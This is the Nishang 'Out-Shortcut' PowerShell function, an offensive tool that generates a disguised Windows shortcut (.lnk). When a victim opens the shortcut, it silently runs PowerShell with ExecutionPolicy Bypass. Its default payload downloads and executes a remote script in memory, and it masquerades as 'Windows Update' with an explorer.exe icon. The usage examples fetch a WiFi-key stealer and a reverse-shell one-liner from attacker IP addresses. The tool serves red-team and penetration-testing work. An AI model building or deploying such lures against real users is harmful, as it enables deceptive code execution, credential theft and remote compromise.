
function Out-Shortcut
{
<#
.SYNOPSIS
Nishang script which creates a shortcut capable of launching PowerShell commands and scripts.

.DESCRIPTION
The script generates a shortcut (.lnk). When a target opens the shortcut, the predefined powershell scripts and/or commands get executed.
A hotkey for the shortcut could also be generated. Also, the icon of the shortcut could be set too.

.PARAMETER Executable
EXE which you want to execute on the target. Default is PowerShell.

.PARAMETER Payload
Payload which you want to execute on the target.

.PARAMETER PayloadURL
URL of the powershell script which would be executed on the target.

.PARAMETER Arguments
Arguments to the powershell script to be executed on the target.

.PARAMETER OutputPath
Path to the .lnk file to be generated. Default is with the name Shortcut to File Server.lnk in the current directory.

.PARAMETER Hotkey
The Hotkey to be assigned to the shortcut. Default is F5.

.PARAMETER Icon
The Icon to be assigned to the generated shortcut. Default is that of explorer.exe

.EXAMPLE
PS > Out-Shortcut -Payload "-WindowStyle hidden -ExecutionPolicy Bypass -noprofile -noexit -c Get-ChildItem"

Above command would execute Get-ChildItem on the target machine when the shortcut is opened. Note that powershell.exe is 
not a part of the payload as the shortcut already points to it.

.EXAMPLE
PS > Out-Shortcut -PayloadURL http://192.168.254.1/Get-Wlan-Keys.ps1

Use above command to generate a Shortcut which download and execute the given powershell script in memory on target.

.EXAMPLE
PS > Out-Shortcut -Payload "-EncodedCommand <>"

Use above command to generate a Shortcut which executes the given encoded command/script.
Use Invoke-Encode from Nishang to encode the command or script.


.EXAMPLE
PS > Out-Shortcut -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM

Use above command to pass an argument to the powershell script/module.

.EXAMPLE
PS > Out-Shortcut -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM -HotKey 'F3'

Use above command to assign F3 as hotkey to the shortcut

.EXAMPLE
PS > Out-Shortcut -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM -HotKey 'F3' -Icon 'notepad.exe'

Use above command to assign notepad icon to the generated shortcut.

.EXAMPLE
PS > Out-Shortcut -Executable C:\Windows\System32\cmd.exe -Payload " /c powershell -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('http://192.168.102.1/Invoke-PowerShellTcpOneLine.ps1'))"

Use above command to use a custom executable and payload.

.LINK
http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
https://github.com/samratashok/nishang
http://blog.trendmicro.com/trendlabs-security-intelligence/black-magic-windows-powershell-used-again-in-new-attack/
#>
    [CmdletBinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Executable = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        
        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $Payload,
        
        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $PayloadURL,

        
        [Parameter(Position = 3, Mandatory = $False)]
        [String]
        $Arguments,

        [Parameter(Position = 4, Mandatory = $False)]
        [String]
        $OutputPath = "$pwd\Shortcut to File Server.lnk",

        [Parameter(Position = 5, Mandatory = $False)]
        [String]
        $HotKey = 'F5',


        [Parameter(Position = 6, Mandatory = $False)]
        [String]
        $Icon='explorer.exe'




    )
    if(!$Payload)
    {
        $Payload = " -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
    }
    $WshShell = New-Object -comObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($OutputPath)
    $Shortcut.TargetPath = $Executable
    $Shortcut.Description = "Shortcut to Windows Update Commandline"
    $Shortcut.WindowStyle = 7
    $Shortcut.Hotkey = $HotKey
    $Shortcut.IconLocation = "$Icon,0"
    $Shortcut.Arguments = $Payload
    $Shortcut.Save()
    Write-Output "The Shortcut file has been written as $OutputPath"

}

